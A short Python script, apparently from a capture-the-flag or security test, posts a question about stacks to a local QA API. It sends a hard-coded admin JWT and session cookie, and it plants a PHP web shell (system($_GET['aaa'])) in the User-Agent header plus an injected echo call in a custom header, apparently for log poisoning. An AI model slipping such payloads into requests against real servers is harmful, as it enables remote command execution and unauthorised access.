import requests
import json

url = "http://127.0.0.1:5000/api/qa"

payload = json.dumps({
  "question": "请你解释一下栈这个东西"
})
headers = {
  'Authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.qI9mpZKBIB3Z009gZnezZ563C8B397jYjAZpoTmLTAc',
  'User-Agent': 'aaa <?php system($_GET[\'aaa\']); ?>',
  'shell': 'echo("aaa");',
  'Content-Type': 'application/json',
  'Cookie': 'session=.eJwljktqAzEQRK8iem2CPt0taU6RfTCmJbU8A5M4jMYr47tHkFVRH4r3glvfZaw6YPl6gTmnwLeOIXeFC3zuKkPN_rib7cecDyO1ztKc6zbM79x8wPV9vcyTQ8cKy3k8dbqtwQJWUyHX0NnEjZvVztGFRI7FUuQarDJjxOwx1UBCXjoRp67J-sLoPAZySToKzSQQqrpeiLJkluJ849Ail5aYJddG2GKOGFSTYOAw8W_Pocc_jYP3Hz5LRH0.abTRlw.tOzVSYxol9Q4qJ88O_uzklCkhA0'
}

response = requests.request("POST", url, headers=headers, data=payload)

print(response.text)
